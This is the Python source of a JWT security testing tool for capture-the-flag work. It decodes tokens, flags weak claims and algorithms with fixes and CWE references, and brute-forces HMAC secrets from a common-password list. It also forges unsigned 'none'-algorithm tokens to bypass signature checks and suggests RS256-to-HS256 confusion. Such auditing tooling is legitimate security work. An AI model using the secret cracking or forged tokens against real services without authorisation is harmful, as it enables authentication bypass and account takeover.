#!/usr/bin/env python3
"""
JWT-Analyzer - Fast JWT Security Testing Tool for CTFs
Detects common JWT misconfigurations and weaknesses
"""

import jwt
import sys
import json
import hashlib
import yaml
import argparse
from datetime import datetime
from colorama import Fore, Style, init

init(autoreset=True)

# Common weak secrets for brute force
WEAK_SECRETS = [
    'secret', 'Secret', 'SECRET',
    'password', 'Password', 'PASSWORD',
    '123456', '12345678', 'qwerty',
    'admin', 'test', 'jwt',
    'key', 'private', 'changeme',
    '', ' '  # Empty and space
]

def print_banner():
    print(f"""{Fore.CYAN}
╔═══════════════════════════════════════════╗
║     JWT-Analyzer v1.0 - CTF Edition       ║
║   Fast JWT Security Testing & Analysis    ║
╚═══════════════════════════════════════════╝
{Style.RESET_ALL}""")

def decode_token(token):
    """Decode JWT without verification"""
    try:
        # Get header
        header = jwt.get_unverified_header(token)
        
        # Get payload
        payload = jwt.decode(token, options={"verify_signature": False})
        
        return header, payload
    except Exception as e:
        print(f"{Fore.RED}[!] Error decoding token: {e}{Style.RESET_ALL}")
        return None, None

def analyze_algorithm(header, token):
    """Check for algorithm vulnerabilities"""
    issues = []
    
    alg = header.get('alg', 'Unknown')
    
    print(f"\n{Fore.YELLOW}[*] Algorithm Analysis{Style.RESET_ALL}")
    print(f"Algorithm: {alg}")
    
    # Check for 'none' algorithm
    if alg.lower() == 'none':
        issues.append({
            'severity': 'CRITICAL',
            'issue': 'Algorithm set to "none"',
            'impact': 'Signature verification completely bypassed',
            'cwe': 'CWE-347',
            'exploit': 'Remove signature, keep trailing dot: header.payload.'
        })
        print(f"{Fore.RED}[!] CRITICAL: 'none' algorithm detected!{Style.RESET_ALL}")
    
    # Check for symmetric algorithms
    elif alg in ['HS256', 'HS384', 'HS512']:
        issues.append({
            'severity': 'HIGH',
            'issue': f'Symmetric algorithm {alg} used',
            'impact': 'Vulnerable to weak secret brute force',
            'cwe': 'CWE-326',
            'exploit': 'Attempt brute force with common secrets'
        })
        print(f"{Fore.YELLOW}[!] WARNING: Symmetric algorithm (brute-forceable){Style.RESET_ALL}")
        
        # Try to crack with weak secrets
        print(f"{Fore.YELLOW}[*] Attempting to crack with common secrets...{Style.RESET_ALL}")
        cracked = brute_force_jwt(token, alg)
        if cracked:
            issues[-1]['cracked_secret'] = cracked
    
    # Check for algorithm confusion (RS256 -> HS256)
    elif alg in ['RS256', 'RS384', 'RS512']:
        issues.append({
            'severity': 'MEDIUM',
            'issue': 'Asymmetric algorithm - check for confusion attack',
            'impact': 'May be vulnerable to algorithm confusion (RS256->HS256)',
            'cwe': 'CWE-347',
            'exploit': 'Try changing alg to HS256 and sign with public key'
        })
        print(f"{Fore.CYAN}[*] INFO: Asymmetric algorithm - test for confusion{Style.RESET_ALL}")
    
    return issues

def analyze_payload(payload):
    """Check payload for security issues"""
    issues = []
    
    print(f"\n{Fore.YELLOW}[*] Payload Analysis{Style.RESET_ALL}")
    
    # Check for expiration
    if 'exp' not in payload:
        issues.append({
            'severity': 'HIGH',
            'issue': 'No expiration claim (exp)',
            'impact': 'Token never expires - replay attacks possible',
            'cwe': 'CWE-613',
            'recommendation': 'Add "exp" claim with reasonable TTL (e.g., 15 minutes)'
        })
        print(f"{Fore.RED}[!] HIGH: No expiration claim found{Style.RESET_ALL}")
    else:
        exp_time = datetime.fromtimestamp(payload['exp'])
        now = datetime.now()
        if exp_time < now:
            print(f"{Fore.GREEN}[✓] Token expired: {exp_time}{Style.RESET_ALL}")
        else:
            ttl = (exp_time - now).total_seconds()
            print(f"{Fore.CYAN}[*] Token valid for: {int(ttl)} seconds{Style.RESET_ALL}")
            if ttl > 86400:  # 24 hours
                issues.append({
                    'severity': 'MEDIUM',
                    'issue': 'Expiration too long',
                    'impact': f'Token valid for {int(ttl/3600)} hours',
                    'cwe': 'CWE-613',
                    'recommendation': 'Reduce TTL to 15-60 minutes'
                })
    
    # Check for issued at
    if 'iat' not in payload:
        issues.append({
            'severity': 'LOW',
            'issue': 'No "iat" (issued at) claim',
            'impact': 'Cannot track token age',
            'recommendation': 'Add "iat" claim'
        })
        print(f"{Fore.YELLOW}[!] WARNING: No issued-at timestamp{Style.RESET_ALL}")
    
    # Check for JTI (unique identifier)
    if 'jti' not in payload:
        issues.append({
            'severity': 'LOW',
            'issue': 'No "jti" (JWT ID) claim',
            'impact': 'Cannot blacklist individual tokens',
            'recommendation': 'Add unique "jti" for token revocation'
        })
    
    # Check for sensitive data
    sensitive_keys = ['password', 'ssn', 'credit_card', 'secret', 'private_key']
    for key in payload.keys():
        if any(s in key.lower() for s in sensitive_keys):
            issues.append({
                'severity': 'CRITICAL',
                'issue': f'Sensitive data in payload: {key}',
                'impact': 'JWT payload is base64-encoded, NOT encrypted',
                'cwe': 'CWE-200',
                'recommendation': 'Remove sensitive data from JWT'
            })
            print(f"{Fore.RED}[!] CRITICAL: Sensitive field detected: {key}{Style.RESET_ALL}")
    
    return issues

def brute_force_jwt(token, algorithm):
    """Attempt to brute force JWT signature with common secrets"""
    for secret in WEAK_SECRETS:
        try:
            jwt.decode(token, secret, algorithms=[algorithm])
            print(f"{Fore.RED}[!!!] SECRET CRACKED: '{secret}'{Style.RESET_ALL}")
            return secret
        except jwt.InvalidSignatureError:
            continue
        except Exception:
            continue
    
    print(f"{Fore.GREEN}[✓] Secret not in common list{Style.RESET_ALL}")
    return None

def generate_none_algorithm_token(header, payload):
    """Generate token with 'none' algorithm (for testing)"""
    import base64
    
    # Modify header
    header['alg'] = 'none'
    
    # Encode header and payload
    header_b64 = base64.urlsafe_b64encode(
        json.dumps(header).encode()
    ).decode().rstrip('=')
    
    payload_b64 = base64.urlsafe_b64encode(
        json.dumps(payload).encode()
    ).decode().rstrip('=')
    
    # Create token with no signature (but keep the dot)
    none_token = f"{header_b64}.{payload_b64}."
    
    return none_token

def export_to_nuclei(issues, token):
    """Export findings as Nuclei template"""
    
    template = {
        "id": "jwt-misconfiguration",
        "info": {
            "name": "JWT Security Misconfiguration",
            "author": "jwt-analyzer",
            "severity": "high",
            "description": "Detected JWT with security issues"
        },
        "requests": [{
            "method": "GET",
            "path": ["{{BaseURL}}"],
            "headers": {
                "Authorization": f"Bearer {token}"
            },
            "matchers": [{
                "type": "word",
                "words": ["success", "authenticated"]
            }]
        }]
    }
    
    filename = f"jwt_test_{datetime.now().strftime('%Y%m%d_%H%M%S')}.yaml"
    with open(filename, 'w') as f:
        import yaml
        yaml.dump(template, f, default_flow_style=False)
    
    print(f"{Fore.GREEN}[+] Nuclei template exported: {filename}{Style.RESET_ALL}")

def main():
    parser = argparse.ArgumentParser(
        description="JWT-Analyzer - Fast JWT Security Testing",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 jwt_analyzer.py <token>
  python3 jwt_analyzer.py <token> --nuclei
  python3 jwt_analyzer.py <token> --generate-none
        """
    )
    
    parser.add_argument('token', help='JWT token to analyze')
    parser.add_argument('--nuclei', action='store_true', help='Export as Nuclei template')
    parser.add_argument('--generate-none', action='store_true', help='Generate none-algorithm version')
    parser.add_argument('--json', action='store_true', help='Output as JSON')
    parser.add_argument('--no-banner', action='store_true', help='Suppress banner')
    
    args = parser.parse_args()
    
    if not args.no_banner:
        print_banner()
    
    token = args.token
    
    # Decode token
    print(f"{Fore.YELLOW}[*] Analyzing JWT token...{Style.RESET_ALL}\n")
    header, payload = decode_token(token)
    
    if not header or not payload:
        sys.exit(1)
    
    # Display decoded token
    print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}DECODED TOKEN{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
    print(f"\n{Fore.YELLOW}Header:{Style.RESET_ALL}")
    print(json.dumps(header, indent=2))
    print(f"\n{Fore.YELLOW}Payload:{Style.RESET_ALL}")
    print(json.dumps(payload, indent=2))
    
    # Analyze for vulnerabilities
    print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}SECURITY ANALYSIS{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
    
    all_issues = []
    
    # Algorithm analysis
    alg_issues = analyze_algorithm(header, token)
    all_issues.extend(alg_issues)
    
    # Payload analysis
    payload_issues = analyze_payload(payload)
    all_issues.extend(payload_issues)
    
    # Summary
    print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}SUMMARY{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
    
    critical = len([i for i in all_issues if i['severity'] == 'CRITICAL'])
    high = len([i for i in all_issues if i['severity'] == 'HIGH'])
    medium = len([i for i in all_issues if i['severity'] == 'MEDIUM'])
    low = len([i for i in all_issues if i['severity'] == 'LOW'])
    
    print(f"\nTotal Issues Found: {len(all_issues)}")
    if critical > 0:
        print(f"{Fore.RED}  CRITICAL: {critical}{Style.RESET_ALL}")
    if high > 0:
        print(f"{Fore.RED}  HIGH: {high}{Style.RESET_ALL}")
    if medium > 0:
        print(f"{Fore.YELLOW}  MEDIUM: {medium}{Style.RESET_ALL}")
    if low > 0:
        print(f"{Fore.CYAN}  LOW: {low}{Style.RESET_ALL}")
    
    # Detailed issues
    print(f"\n{Fore.YELLOW}Detailed Findings:{Style.RESET_ALL}\n")
    for i, issue in enumerate(all_issues, 1):
        severity_color = Fore.RED if issue['severity'] in ['CRITICAL', 'HIGH'] else Fore.YELLOW
        print(f"{severity_color}[{i}] {issue['severity']}: {issue['issue']}{Style.RESET_ALL}")
        print(f"    Impact: {issue['impact']}")
        if 'cwe' in issue:
            print(f"    CWE: {issue['cwe']}")
        if 'exploit' in issue:
            print(f"    Exploit: {issue['exploit']}")
        if 'recommendation' in issue:
            print(f"    Fix: {issue['recommendation']}")
        if 'cracked_secret' in issue:
            print(f"{Fore.RED}    Cracked Secret: '{issue['cracked_secret']}'{Style.RESET_ALL}")
        print()
    
    # Generate none-algorithm version if requested
    if args.generate_none:
        print(f"{Fore.YELLOW}[*] Generating 'none' algorithm version...{Style.RESET_ALL}")
        none_token = generate_none_algorithm_token(header, payload)
        print(f"\n{Fore.GREEN}Modified Token (algorithm='none'):{Style.RESET_ALL}")
        print(none_token)
        print(f"\n{Fore.YELLOW}Test this token to bypass signature verification!{Style.RESET_ALL}\n")
    
    # Export to Nuclei if requested
    if args.nuclei:
        export_to_nuclei(all_issues, token)
    
    # JSON output
    if args.json:
        output = {
            'header': header,
            'payload': payload,
            'issues': all_issues,
            'summary': {
                'total': len(all_issues),
                'critical': critical,
                'high': high,
                'medium': medium,
                'low': low
            }
        }
        print(f"\n{json.dumps(output, indent=2)}")

if __name__ == "__main__":
    main()